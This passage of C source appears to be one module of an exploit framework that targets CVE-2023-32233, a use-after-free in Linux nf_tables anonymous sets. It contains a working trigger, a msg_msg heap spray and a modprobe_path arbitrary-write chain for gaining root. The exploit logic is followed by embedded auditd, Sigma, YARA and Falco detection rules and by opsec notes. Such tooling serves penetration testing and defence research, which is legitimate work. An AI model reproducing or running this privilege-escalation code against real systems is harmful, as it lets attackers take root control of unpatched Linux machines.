        for (int i = 0; i < SPRAY_QUEUES; i++) ac.qids[i] = -1;

        /* Initial trigger + pre-spray. */
        uint32_t seq = (uint32_t)time(NULL);
        size_t blen = build_trigger_batch(batch, 16 * 1024, &seq);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_set_uaf: sending trigger batch (%zu bytes)\n",
                    blen);
        }
        if (nft_send_batch(sock, batch, blen) < 0) {
            fprintf(stderr, "[-] nft_set_uaf: trigger batch failed\n");
            free(batch); close(sock);
            return SKELETONKEY_EXPLOIT_FAIL;
        }

        skeletonkey_result_t r = skeletonkey_finisher_modprobe_path(&koff,
                                  nft_set_uaf_arb_write, &ac, !ctx->no_shell);

        /* drain whatever queues we created during arb-writes */
        drain_msg_msg(ac.qids);
        free(batch);
        close(sock);
        return r;
    }

    /* --- primitive-only path: fork-isolated trigger -------------- */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* --- CHILD --- */
        if (enter_unpriv_namespaces() < 0) _exit(20);

        if (!ctx->json) {
            fprintf(stderr, "[*] nft_set_uaf: entered userns+netns; opening "
                            "nfnetlink\n");
        }

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC,
                          NETLINK_NETFILTER);
        if (sock < 0) { perror("[-] socket(NETLINK_NETFILTER)"); _exit(21); }

        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); _exit(22);
        }
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        /* Phase 1: pre-spray msg_msg to predictabilify kmalloc-cg-512. */
        int qids[SPRAY_QUEUES];
        for (int i = 0; i < SPRAY_QUEUES; i++) qids[i] = -1;
        int sprayed = spray_msg_msg(qids);
        if (sprayed <= 0) {
            fprintf(stderr, "[-] nft_set_uaf: pre-spray failed\n");
            close(sock); _exit(23);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_set_uaf: pre-sprayed %d msg_msg queues "
                            "(tag=%s)\n", sprayed, SKELETONKEY_TAG);
        }

        /* Snapshot before. */
        long before = slabinfo_active("kmalloc-cg-512");
        if (before < 0) before = slabinfo_active("kmalloc-512");

        /* Phase 2: build & send the full trigger batch. */
        uint8_t *batch = calloc(1, 16 * 1024);
        if (!batch) { close(sock); drain_msg_msg(qids); _exit(24); }
        uint32_t seq = (uint32_t)time(NULL);
        size_t blen = build_trigger_batch(batch, 16 * 1024, &seq);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_set_uaf: sending NEWTABLE/CHAIN/SET/RULE/"
                            "DELSET/DELRULE batch (%zu bytes)\n", blen);
        }
        if (nft_send_batch(sock, batch, blen) < 0) {
            fprintf(stderr, "[-] nft_set_uaf: batch send failed\n");
            drain_msg_msg(qids); free(batch); close(sock); _exit(25);
        }

        /* Give kernel time to run commit cleanup + UAF window. */
        usleep(50 * 1000);

        long after = slabinfo_active("kmalloc-cg-512");
        if (after < 0) after = slabinfo_active("kmalloc-512");
        if (!ctx->json) {
            fprintf(stderr, "[i] nft_set_uaf: kmalloc-cg-512 active: %ld → %ld\n",
                    before, after);
        }

        log_breadcrumb(before, after, sprayed);

        drain_msg_msg(qids);
        free(batch);
        close(sock);

        _exit(100);   /* primitive-only sentinel */
    }

    /* --- PARENT --- */
    int status;
    waitpid(child, &status, 0);

    if (!WIFEXITED(status)) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nft_set_uaf: child died by signal %d — bug "
                            "likely fired (KASAN/oops can manifest as child "
                            "signal)\n", WTERMSIG(status));
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc == 100) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nft_set_uaf: trigger fired; anonymous-set\n"
                            "    UAF induced + msg_msg spray landed in\n"
                            "    kmalloc-cg-512. R/W chain NOT executed\n"
                            "    (Option B scope).\n"
                            "[i] nft_set_uaf: see /tmp/skeletonkey-nft_set_uaf.log\n"
                            "    for slab-delta breadcrumb. Pass --full-chain\n"
                            "    to attempt modprobe_path root-pop.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (rc >= 20 && rc <= 25) {
        if (!ctx->json) {
            fprintf(stderr, "[-] nft_set_uaf: trigger setup failed (child rc=%d)\n",
                    rc);
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[-] nft_set_uaf: unexpected child rc=%d\n", rc);
    }
    return SKELETONKEY_EXPLOIT_FAIL;
#endif /* __linux__ */
}

/* ------------------------------------------------------------------
 * Cleanup — best-effort drain
 * ------------------------------------------------------------------ */

static skeletonkey_result_t nft_set_uaf_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    /* Best-effort breadcrumb removal. We can't drain msg queues from a
     * different process (they live in a private IPC namespace anyway,
     * which exited with the child). */
    if (unlink("/tmp/skeletonkey-nft_set_uaf.log") != 0 && errno != ENOENT) {
        /* not fatal */
    }
    return SKELETONKEY_OK;
}

/* ------------------------------------------------------------------
 * Embedded detection rules
 * ------------------------------------------------------------------ */

static const char nft_set_uaf_auditd[] =
    "# nft_set anonymous-set UAF (CVE-2023-32233) — auditd detection rules\n"
    "# Flag unshare(CLONE_NEWUSER|CLONE_NEWNET) followed by nfnetlink\n"
    "# transactions that mix NEWSET+DELSET in the same batch. Legitimate\n"
    "# nft scripts rarely DELSET an anonymous set they just created;\n"
    "# tune per env for firewalld/podman noise.\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-nft_set_uaf-userns\n"
    "-a always,exit -F arch=b32 -S unshare -k skeletonkey-nft_set_uaf-userns\n"
    "# Watch nfnetlink writes (the trigger batch goes via NETLINK_NETFILTER):\n"
    "-a always,exit -F arch=b64 -S sendmsg -F a0!=0 -k skeletonkey-nft_set_uaf-nft\n"
    "# msg_msg cross-cache groom: msgsnd bursts on multiple queues:\n"
    "-a always,exit -F arch=b64 -S msgsnd -k skeletonkey-nft_set_uaf-msgsnd\n"
    "# Canonical post-exploit primitives:\n"
    "-a always,exit -F arch=b64 -S setresuid -F a0=0 -F a1=0 -F a2=0 -k skeletonkey-nft_set_uaf-priv\n";

static const char nft_set_uaf_sigma[] =
    "title: Possible CVE-2023-32233 nft anonymous-set UAF exploitation\n"
    "id: 23233e7c-skeletonkey-nft-set-uaf\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the canonical exploit shape for the nf_tables anonymous-set\n"
    "  use-after-free (Sondej/Krysiuk, May 2023): an unprivileged process\n"
    "  creates a user namespace + net namespace, then issues an nfnetlink\n"
    "  batch that creates and deletes an anonymous set in the same\n"
    "  transaction, followed by a msg_msg spray (msgsnd burst).\n"
    "  False positives: containers (podman/docker rootless), firewalld\n"
    "  ruleset reloads. Combine with process-tree: a previously-unpriv\n"
    "  process that suddenly has effective uid 0 is the smoking gun.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns_clone:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'unshare'\n"
    "    a0: 0x10000000\n"
    "  nft_writes:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'sendmsg'\n"
    "  msg_spray:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'msgsnd'\n"
    "  uid_change:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'setresuid'\n"
    "    auid|expression: '!= 0'\n"
    "  condition: userns_clone and nft_writes and msg_spray\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2023.32233]\n";

static const char nft_set_uaf_yara[] =
    "rule nft_set_uaf_cve_2023_32233 : cve_2023_32233 kernel_uaf\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2023-32233\"\n"
    "        description = \"nft anonymous-set UAF spray tag (SKELETONKEY_SET) and log breadcrumb\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $tag = \"SKELETONKEY_SET\" ascii\n"
    "        $log = \"/tmp/skeletonkey-nft_set_uaf.log\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char nft_set_uaf_falco[] =
    "- rule: nft anonymous-set lookup-UAF batch by non-root\n"
    "  desc: |\n"
    "    Non-root nfnetlink single-batch transaction: NEWTABLE +\n"
    "    NEWCHAIN + NEWSET (anonymous, EVAL) + NEWRULE with\n"
    "    nft_lookup referencing the anon set + DELSET + DELRULE.\n"
    "    The lookup's set reference isn't deactivated; UAF when\n"
    "    set frees. CVE-2023-32233.\n"
    "  condition: >\n"
    "    evt.type = sendmsg and fd.sockfamily = AF_NETLINK and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    nfnetlink anon-set batch from non-root\n"
    "    (user=%user.name pid=%proc.pid)\n"
    "  priority: HIGH\n"
    "  tags: [network, mitre_privilege_escalation, T1068, cve.2023.32233]\n";

const struct skeletonkey_module nft_set_uaf_module = {
    .name           = "nft_set_uaf",
    .cve            = "CVE-2023-32233",
    .summary        = "nf_tables anonymous-set UAF (Sondej+Krysiuk) — primitive + groom",
    .family         = "nf_tables",
    .kernel_range   = "5.1 ≤ K, fixed mainline 6.4-rc4; backports: 6.3.2 / 6.2.15 / 6.1.28 / 5.15.111 / 5.10.180 / 5.4.243 / 4.19.283",
    .detect         = nft_set_uaf_detect,
    .exploit        = nft_set_uaf_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; OR set unprivileged_userns_clone=0 */
    .cleanup        = nft_set_uaf_cleanup,
    .detect_auditd  = nft_set_uaf_auditd,
    .detect_sigma   = nft_set_uaf_sigma,
    .detect_yara    = nft_set_uaf_yara,
    .detect_falco   = nft_set_uaf_falco,
    .opsec_notes    = "unshare(CLONE_NEWUSER|CLONE_NEWNET) + single nfnetlink transaction: NEWTABLE + NEWCHAIN + NEWSET (anonymous, ANONYMOUS|CONSTANT|EVAL) + NEWRULE with nft_lookup referencing the anon set + DELSET + DELRULE. Vulnerable kernels do not deactivate the lookup's set ref on commit -> UAF when set frees. msg_msg cg-512 spray (32 queues x 16 msgs, tag 'SKELETONKEY_SET'). --full-chain re-fires with forged headers (data ptr = kaddr) and NEWSETELEM payload. Writes /tmp/skeletonkey-nft_set_uaf.log. Audit-visible via unshare + socket(NETLINK_NETFILTER) + sendmsg + msgsnd. Dmesg: KASAN oops on UAF. Cleanup unlinks log.",
};

void skeletonkey_register_nft_set_uaf(void)
{
    skeletonkey_register(&nft_set_uaf_module);
}
